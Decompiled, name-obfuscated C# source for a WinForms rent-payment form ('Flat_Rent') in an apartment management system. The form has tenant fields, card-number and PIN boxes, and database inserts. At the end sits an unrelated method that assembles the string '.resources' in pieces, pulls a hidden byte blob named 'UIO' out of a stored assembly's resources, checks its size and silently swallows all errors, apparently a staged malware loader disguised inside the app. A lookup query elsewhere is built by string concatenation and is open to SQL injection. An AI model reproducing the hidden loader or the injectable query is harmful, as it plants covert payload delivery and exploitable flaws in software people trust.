using System;
using System.ComponentModel;
using System.Data;
using System.Data.SqlClient;
using System.Drawing;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Hz6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using p9K;

namespace Ly6n;

[DesignerGenerated]
public class Be4z : Form
{
	private IContainer components;

	private Label _Label1;

	private Label _Label2;

	private Label _Label3;

	private MaskedTextBox _MaskedTextBox1;

	private Label _Label8;

	private Button _PAY;

	private ComboBox _ComboBox5;

	private Panel _Panel1;

	private MaskedTextBox _MaskedTextBox5;

	private MaskedTextBox _MaskedTextBox4;

	private Label _CardNumber;

	private Button _Submit;

	private TextBox _b_name;

	private Button _Button1;

	private SqlDataReader rd;

	internal ComboBox b;

	internal Label h;

	internal Label j;

	internal Label f;

	internal Label y;

	internal Button I;

	internal MaskedTextBox C;

	internal Label E;

	internal Label k;

	internal Panel D;

	internal TextBox n;

	internal TextBox X;

	internal DateTimePicker A;

	internal SqlConnection G;

	internal SqlCommand u;

	public Be4z()
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001f: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Rr52);
		SqlConnection val = (G = new SqlConnection());
		SqlCommand val2 = (u = new SqlCommand());
		x8E7();
	}

	protected override void n6G0(bool Pe1d)
	{
		try
		{
			if (Pe1d && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Pe1d);
		}
	}

	private void x8E7()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_0304: Unknown result type (might be due to invalid IL or missing references)
		//IL_030e: Expected O, but got Unknown
		//IL_0377: Unknown result type (might be due to invalid IL or missing references)
		//IL_0381: Expected O, but got Unknown
		//IL_0404: Unknown result type (might be due to invalid IL or missing references)
		//IL_040e: Expected O, but got Unknown
		//IL_0491: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Expected O, but got Unknown
		//IL_051e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0528: Expected O, but got Unknown
		//IL_05ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b6: Expected O, but got Unknown
		//IL_07db: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e5: Expected O, but got Unknown
		//IL_0cd6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ce0: Expected O, but got Unknown
		//IL_0df7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e01: Expected O, but got Unknown
		Ry9c(new Label());
		x0M8(new Label());
		z8D1(new ComboBox());
		Cd40(new Label());
		Yc28(new MaskedTextBox());
		Cs19(new Label());
		i7XE(new Label());
		Xs2i(new Label());
		Yp3w(new Label());
		c9N3(new Label());
		Az64(new Button());
		Zc3r(new Button());
		w3F0(new MaskedTextBox());
		n1XD(new ComboBox());
		Pa7p(new Label());
		Es35(new Panel());
		b7E3(new DateTimePicker());
		Je39(new TextBox());
		Ma19(new TextBox());
		Sz0a(new TextBox());
		Ef73(new Panel());
		i7N9(new Button());
		Xw02(new Label());
		Qq5e(new MaskedTextBox());
		Bt7i(new MaskedTextBox());
		f8XQ(new Label());
		a3RW(new Button());
		((Control)Jp07()).SuspendLayout();
		((Control)b9TH()).SuspendLayout();
		((Control)this).SuspendLayout();
		No59().set_AutoSize(true);
		((Control)No59()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)No59()).set_Location(new Point(31, 87));
		((Control)No59()).set_Name("Label1");
		((Control)No59()).set_Size(new Size(70, 17));
		((Control)No59()).set_TabIndex(0);
		No59().set_Text("Tenant ID");
		o2PN().set_AutoSize(true);
		((Control)o2PN()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)o2PN()).set_Location(new Point(180, 18));
		((Control)o2PN()).set_Name("Label2");
		((Control)o2PN()).set_Size(new Size(85, 17));
		((Control)o2PN()).set_TabIndex(1);
		o2PN().set_Text("Rent Details");
		((ListControl)Pb1x()).set_FormattingEnabled(true);
		((Control)Pb1x()).set_Location(new Point(175, 84));
		((Control)Pb1x()).set_Name("ComboBox1");
		((Control)Pb1x()).set_Size(new Size(168, 24));
		((Control)Pb1x()).set_TabIndex(2);
		Km3r().set_AutoSize(true);
		((Control)Km3r()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Km3r()).set_Location(new Point(34, 149));
		((Control)Km3r()).set_Name("Label3");
		((Control)Km3r()).set_Size(new Size(45, 17));
		((Control)Km3r()).set_TabIndex(3);
		Km3r().set_Text("Name");
		((Control)m7D1()).set_Font(new Font("Microsoft Sans Serif", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)m7D1()).set_Location(new Point(175, 141));
		((Control)m7D1()).set_Name("MaskedTextBox1");
		((Control)m7D1()).set_Size(new Size(168, 28));
		((Control)m7D1()).set_TabIndex(5);
		w6L3().set_AutoSize(true);
		((Control)w6L3()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)w6L3()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)w6L3()).set_Location(new Point(31, 209));
		((Control)w6L3()).set_Name("Label5");
		((Control)w6L3()).set_Size(new Size(83, 17));
		((Control)w6L3()).set_TabIndex(6);
		w6L3().set_Text("Block Name");
		Ln14().set_AutoSize(true);
		((Control)Ln14()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Ln14()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Ln14()).set_Location(new Point(34, 255));
		((Control)Ln14()).set_Name("Label6");
		((Control)Ln14()).set_Size(new Size(67, 17));
		((Control)Ln14()).set_TabIndex(7);
		Ln14().set_Text("Flat Type");
		f1B3().set_AutoSize(true);
		((Control)f1B3()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)f1B3()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)f1B3()).set_Location(new Point(34, 298));
		((Control)f1B3()).set_Name("Label7");
		((Control)f1B3()).set_Size(new Size(85, 17));
		((Control)f1B3()).set_TabIndex(8);
		f1B3().set_Text("Flat Number");
		Hm30().set_AutoSize(true);
		((Control)Hm30()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Hm30()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Hm30()).set_Location(new Point(34, 451));
		((Control)Hm30()).set_Name("Label8");
		((Control)Hm30()).set_Size(new Size(90, 17));
		((Control)Hm30()).set_TabIndex(9);
		Hm30().set_Text("Rent Amount");
		n6QB().set_AutoSize(true);
		((Control)n6QB()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)n6QB()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)n6QB()).set_Location(new Point(34, 349));
		((Control)n6QB()).set_Name("Label10");
		((Control)n6QB()).set_Size(new Size(49, 17));
		((Control)n6QB()).set_TabIndex(11);
		n6QB().set_Text("Phone");
		((Control)t6N0()).set_Location(new Point(53, 518));
		((Control)t6N0()).set_Name("PAY");
		((Control)t6N0()).set_Size(new Size(122, 34));
		((Control)t6N0()).set_TabIndex(12);
		((ButtonBase)t6N0()).set_Text("PAY");
		((ButtonBase)t6N0()).set_UseVisualStyleBackColor(true);
		((Control)Pd52()).set_Location(new Point(219, 518));
		((Control)Pd52()).set_Name("Decline");
		((Control)Pd52()).set_Size(new Size(122, 34));
		((Control)Pd52()).set_TabIndex(13);
		((ButtonBase)Pd52()).set_Text("Decline");
		((ButtonBase)Pd52()).set_UseVisualStyleBackColor(true);
		((Control)As4j()).set_Location(new Point(175, 349));
		((Control)As4j()).set_Name("MaskedTextBox3");
		((Control)As4j()).set_Size(new Size(168, 22));
		((Control)As4j()).set_TabIndex(20);
		((ListControl)d0J2()).set_FormattingEnabled(true);
		d0J2().get_Items().AddRange(new object[3] { "5000", "10000", "15000" });
		((Control)d0J2()).set_Location(new Point(175, 451));
		((Control)d0J2()).set_Name("ComboBox5");
		((Control)d0J2()).set_Size(new Size(168, 24));
		((Control)d0J2()).set_TabIndex(23);
		o6SQ().set_AutoSize(true);
		((Control)o6SQ()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)o6SQ()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)o6SQ()).set_Location(new Point(34, 402));
		((Control)o6SQ()).set_Name("Date3");
		((Control)o6SQ()).set_Size(new Size(38, 17));
		((Control)o6SQ()).set_TabIndex(24);
		o6SQ().set_Text("Date");
		((Control)Jp07()).set_BackColor(Color.FromArgb(128, 64, 64));
		((Control)Jp07()).get_Controls().Add((Control)(object)g3CG());
		((Control)Jp07()).get_Controls().Add((Control)(object)t3BD());
		((Control)Jp07()).get_Controls().Add((Control)(object)Xq37());
		((Control)Jp07()).get_Controls().Add((Control)(object)Wk83());
		((Control)Jp07()).get_Controls().Add((Control)(object)b9TH());
		((Control)Jp07()).get_Controls().Add((Control)(object)o6SQ());
		((Control)Jp07()).get_Controls().Add((Control)(object)d0J2());
		((Control)Jp07()).get_Controls().Add((Control)(object)As4j());
		((Control)Jp07()).get_Controls().Add((Control)(object)Pd52());
		((Control)Jp07()).get_Controls().Add((Control)(object)t6N0());
		((Control)Jp07()).get_Controls().Add((Control)(object)n6QB());
		((Control)Jp07()).get_Controls().Add((Control)(object)Hm30());
		((Control)Jp07()).get_Controls().Add((Control)(object)f1B3());
		((Control)Jp07()).get_Controls().Add((Control)(object)Ln14());
		((Control)Jp07()).get_Controls().Add((Control)(object)w6L3());
		((Control)Jp07()).get_Controls().Add((Control)(object)m7D1());
		((Control)Jp07()).get_Controls().Add((Control)(object)Km3r());
		((Control)Jp07()).get_Controls().Add((Control)(object)Pb1x());
		((Control)Jp07()).get_Controls().Add((Control)(object)o2PN());
		((Control)Jp07()).get_Controls().Add((Control)(object)No59());
		((Control)Jp07()).set_Location(new Point(3, 1));
		((Control)Jp07()).set_Name("Panel1");
		((Control)Jp07()).set_Size(new Size(411, 748));
		((Control)Jp07()).set_TabIndex(1);
		((Control)g3CG()).set_Location(new Point(156, 398));
		((Control)g3CG()).set_Name("DateTimePicker1");
		((Control)g3CG()).set_Size(new Size(200, 22));
		((Control)g3CG()).set_TabIndex(2);
		((Control)t3BD()).set_Location(new Point(173, 298));
		((Control)t3BD()).set_Name("flatNumber");
		((Control)t3BD()).set_Size(new Size(168, 22));
		((Control)t3BD()).set_TabIndex(29);
		((Control)Xq37()).set_Location(new Point(173, 250));
		((Control)Xq37()).set_Name("flattype");
		((Control)Xq37()).set_Size(new Size(168, 22));
		((Control)Xq37()).set_TabIndex(28);
		((Control)Wk83()).set_Location(new Point(175, 203));
		((Control)Wk83()).set_Name("b_name");
		((Control)Wk83()).set_Size(new Size(168, 22));
		((Control)Wk83()).set_TabIndex(27);
		((Control)b9TH()).get_Controls().Add((Control)(object)Mz61());
		((Control)b9TH()).get_Controls().Add((Control)(object)p2D1());
		((Control)b9TH()).get_Controls().Add((Control)(object)o2L1());
		((Control)b9TH()).get_Controls().Add((Control)(object)Tm4t());
		((Control)b9TH()).get_Controls().Add((Control)(object)Mt1g());
		((Control)b9TH()).set_Location(new Point(24, 568));
		((Control)b9TH()).set_Name("Panel2");
		((Control)b9TH()).set_Size(new Size(361, 161));
		((Control)b9TH()).set_TabIndex(26);
		((Control)Mz61()).set_Location(new Point(105, 122));
		((Control)Mz61()).set_Name("Submit");
		((Control)Mz61()).set_Size(new Size(122, 34));
		((Control)Mz61()).set_TabIndex(30);
		((ButtonBase)Mz61()).set_Text("Submit");
		((ButtonBase)Mz61()).set_UseVisualStyleBackColor(true);
		p2D1().set_AutoSize(true);
		((Control)p2D1()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)p2D1()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)p2D1()).set_Location(new Point(10, 12));
		((Control)p2D1()).set_Name("CardNumber");
		((Control)p2D1()).set_Size(new Size(92, 17));
		((Control)p2D1()).set_TabIndex(26);
		p2D1().set_Text("Card Number");
		((Control)o2L1()).set_Location(new Point(154, 65));
		((Control)o2L1()).set_Name("MaskedTextBox5");
		((Control)o2L1()).set_Size(new Size(178, 22));
		((Control)o2L1()).set_TabIndex(29);
		((Control)Tm4t()).set_Location(new Point(154, 12));
		((Control)Tm4t()).set_Name("MaskedTextBox4");
		((Control)Tm4t()).set_Size(new Size(178, 22));
		((Control)Tm4t()).set_TabIndex(27);
		Mt1g().set_AutoSize(true);
		((Control)Mt1g()).set_Font(new Font("Microsoft Sans Serif", 8.25f));
		((Control)Mt1g()).set_ForeColor(SystemColors.ControlLightLight);
		((Control)Mt1g()).set_Location(new Point(13, 67));
		((Control)Mt1g()).set_Name("PinNumber");
		((Control)Mt1g()).set_Size(new Size(82, 17));
		((Control)Mt1g()).set_TabIndex(28);
		Mt1g().set_Text("Pin Number");
		((Control)p3LX()).set_Location(new Point(583, 210));
		((Control)p3LX()).set_Name("Button1");
		((Control)p3LX()).set_Size(new Size(236, 84));
		((Control)p3LX()).set_TabIndex(26);
		((ButtonBase)p3LX()).set_Text("Button1");
		((ButtonBase)p3LX()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(913, 751));
		((Control)this).get_Controls().Add((Control)(object)p3LX());
		((Control)this).get_Controls().Add((Control)(object)Jp07());
		((Control)this).set_Name("Flat_Rent");
		((Form)this).set_Text("Flat_Rent");
		((Control)Jp07()).ResumeLayout(false);
		((Control)Jp07()).PerformLayout();
		((Control)b9TH()).ResumeLayout(false);
		((Control)b9TH()).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Label No59()
	{
		return _Label1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ry9c(Label Hg39)
	{
		_Label1 = Hg39;
	}

	[SpecialName]
	internal virtual Label o2PN()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x0M8(Label Mx3w)
	{
		_Label2 = Mx3w;
	}

	[SpecialName]
	internal virtual ComboBox Pb1x()
	{
		return b;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z8D1(ComboBox Fr0p)
	{
		EventHandler eventHandler = Fq85;
		ComboBox val = b;
		if (val != null)
		{
			val.remove_SelectionChangeCommitted(eventHandler);
		}
		ComboBox val2 = (b = Fr0p);
		val = b;
		if (val != null)
		{
			val.add_SelectionChangeCommitted(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Km3r()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cd40(Label Nz71)
	{
		_Label3 = Nz71;
	}

	[SpecialName]
	internal virtual MaskedTextBox m7D1()
	{
		return _MaskedTextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yc28(MaskedTextBox Jj4y)
	{
		_MaskedTextBox1 = Jj4y;
	}

	[SpecialName]
	internal virtual Label w6L3()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Cs19(Label Ao7q)
	{
		Label val = (h = Ao7q);
	}

	[SpecialName]
	internal virtual Label Ln14()
	{
		return j;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i7XE(Label q2C5)
	{
		Label val = (j = q2C5);
	}

	[SpecialName]
	internal virtual Label f1B3()
	{
		return f;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xs2i(Label Xs6w)
	{
		Label val = (f = Xs6w);
	}

	[SpecialName]
	internal virtual Label Hm30()
	{
		return _Label8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yp3w(Label Pk6j)
	{
		_Label8 = Pk6j;
	}

	[SpecialName]
	internal virtual Label n6QB()
	{
		return y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c9N3(Label Bb0r)
	{
		Label val = (y = Bb0r);
	}

	[SpecialName]
	internal virtual Button t6N0()
	{
		return _PAY;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Az64(Button Hp6x)
	{
		EventHandler eventHandler = Fm46;
		Button pAY = _PAY;
		if (pAY != null)
		{
			((Control)pAY).remove_Click(eventHandler);
		}
		_PAY = Hp6x;
		pAY = _PAY;
		if (pAY != null)
		{
			((Control)pAY).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Pd52()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zc3r(Button j1MF)
	{
		Button val = (I = j1MF);
	}

	[SpecialName]
	internal virtual MaskedTextBox As4j()
	{
		return C;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void w3F0(MaskedTextBox a6N3)
	{
		MaskedTextBox val = (C = a6N3);
	}

	[SpecialName]
	internal virtual ComboBox d0J2()
	{
		return _ComboBox5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void n1XD(ComboBox Ag6d)
	{
		_ComboBox5 = Ag6d;
	}

	[SpecialName]
	internal virtual Label o6SQ()
	{
		return E;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pa7p(Label To9n)
	{
		Label val = (E = To9n);
	}

	[SpecialName]
	internal virtual Panel Jp07()
	{
		return _Panel1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Es35(Panel d9B8)
	{
		_Panel1 = d9B8;
	}

	[SpecialName]
	internal virtual MaskedTextBox o2L1()
	{
		return _MaskedTextBox5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Qq5e(MaskedTextBox w1X0)
	{
		_MaskedTextBox5 = w1X0;
	}

	[SpecialName]
	internal virtual Label Mt1g()
	{
		return k;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void f8XQ(Label Tt1c)
	{
		Label val = (k = Tt1c);
	}

	[SpecialName]
	internal virtual MaskedTextBox Tm4t()
	{
		return _MaskedTextBox4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bt7i(MaskedTextBox Aa0t)
	{
		_MaskedTextBox4 = Aa0t;
	}

	[SpecialName]
	internal virtual Label p2D1()
	{
		return _CardNumber;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xw02(Label b8FE)
	{
		_CardNumber = b8FE;
	}

	[SpecialName]
	internal virtual Button Mz61()
	{
		return _Submit;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i7N9(Button Ds01)
	{
		EventHandler eventHandler = s6L8;
		Button submit = _Submit;
		if (submit != null)
		{
			((Control)submit).remove_Click(eventHandler);
		}
		_Submit = Ds01;
		submit = _Submit;
		if (submit != null)
		{
			((Control)submit).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Panel b9TH()
	{
		return D;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ef73(Panel g2JE)
	{
		Panel val = (D = g2JE);
	}

	[SpecialName]
	internal virtual TextBox t3BD()
	{
		return n;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Je39(TextBox c1TM)
	{
		TextBox val = (n = c1TM);
	}

	[SpecialName]
	internal virtual TextBox Xq37()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ma19(TextBox m8M7)
	{
		TextBox val = (X = m8M7);
	}

	[SpecialName]
	internal virtual TextBox Wk83()
	{
		return _b_name;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sz0a(TextBox Fz0m)
	{
		_b_name = Fz0m;
	}

	[SpecialName]
	internal virtual DateTimePicker g3CG()
	{
		return A;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void b7E3(DateTimePicker Xb75)
	{
		DateTimePicker val = (A = Xb75);
	}

	[SpecialName]
	internal virtual Button p3LX()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a3RW(Button m0L5)
	{
		EventHandler eventHandler = Yr0m;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = m0L5;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	private void s6L8(object sender, EventArgs e)
	{
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		G.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\Manish\\Source\\Repos\\Apartment-Management-System2\\apart.mdf;Integrated Security=True");
		u.set_Connection(G);
		G.Open();
		u.set_CommandText(" insert into RentDetails(tenantId,name,blockNumber,flatType,flatNumber,phone,date,rentAmount)values(@tenantId,@name,@blockNumber,@flatType,@flatNumber,@phone,@date,@rentAmout )");
		u.get_Parameters().Add("@tenantId", SqlDbType.Int).set_Value((object)Pb1x().get_Text());
		u.get_Parameters().Add("@name", SqlDbType.VarChar).set_Value((object)m7D1().get_Text());
		u.get_Parameters().Add("@blockNumber", SqlDbType.Int).set_Value((object)Wk83().get_Text());
		u.get_Parameters().Add("@flatType", SqlDbType.VarChar).set_Value((object)Xq37().get_Text());
		u.get_Parameters().Add("@flatNumber", SqlDbType.Int).set_Value((object)t3BD().get_Text());
		u.get_Parameters().Add("@phone", SqlDbType.Int).set_Value((object)As4j().get_Text());
		u.get_Parameters().Add("@date", SqlDbType.Date).set_Value((object)g3CG().get_Value());
		u.get_Parameters().Add("@rentAmout", SqlDbType.Int).set_Value((object)d0J2().get_Text());
		G.Close();
		Interaction.MsgBox((object)"done", (MsgBoxStyle)0, (object)null);
		Pb1x().set_SelectedIndex(0);
		((TextBoxBase)m7D1()).Clear();
		((TextBoxBase)Wk83()).Clear();
		((TextBoxBase)Xq37()).Clear();
		((TextBoxBase)t3BD()).Clear();
		((TextBoxBase)As4j()).Clear();
		d0J2().set_SelectedIndex(0);
	}

	private void Rr52(object sender, EventArgs e)
	{
		G.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=|DataDirectory|\\apart.mdf;Integrated Security=True");
		u.set_Connection(G);
		u.set_CommandText("Select * from [tenant_login] ");
		G.Open();
		rd = u.ExecuteReader();
		while (rd.Read())
		{
			Pb1x().get_Items().Add(RuntimeHelpers.GetObjectValue(rd.get_Item("tenant_id")));
		}
		rd.Close();
		G.Close();
		((Control)b9TH()).Hide();
	}

	private void Fq85(object sender, EventArgs e)
	{
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		G.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=|DataDirectory|\\apart.mdf;Integrated Security=True");
		u.set_Connection(G);
		u.set_CommandText("Select * from [tenant_login] where tenant_id = " + Pb1x().get_SelectedItem().ToString() + " ");
		G.Open();
		rd = u.ExecuteReader();
		SqlDataReader val = rd;
		if (val.Read())
		{
			m7D1().set_Text(Conversions.ToString(rd.get_Item("tenantName")));
			Wk83().set_Text(Conversions.ToString(rd.get_Item("blockNo")));
			Xq37().set_Text(Conversions.ToString(rd.get_Item("flatType")));
			t3BD().set_Text(Conversions.ToString(rd.get_Item("flatNumber")));
			As4j().set_Text(Conversions.ToString(rd.get_Item("phone")));
		}
		else
		{
			MessageBox.Show("Invalid");
		}
		val = null;
		G.Close();
	}

	private void Fm46(object sender, EventArgs e)
	{
		((Control)b9TH()).Show();
	}

	private void Yr0m(object sender, EventArgs e)
	{
		((Form)this).Close();
		((Control)Gj9.Forms.Xp5()).Show();
	}

	internal static byte[] a1H4(string[] t8CT, int r8YD)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[t8CT.Length - 1 + 1];
				int num = t8CT.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = t8CT[i].Replace(string.Format("{0}{1}{2}{3}", ".re", "sou", "rc", "es"), "");
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)j5N.mDic["Ann"]);
						byte[] array3 = (byte[])resourceManager.GetObject("UIO", CultureInfo.CurrentUICulture);
						if (array3.Length != r8YD)
						{
							continue;
						}
						result = array3;
						return result;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
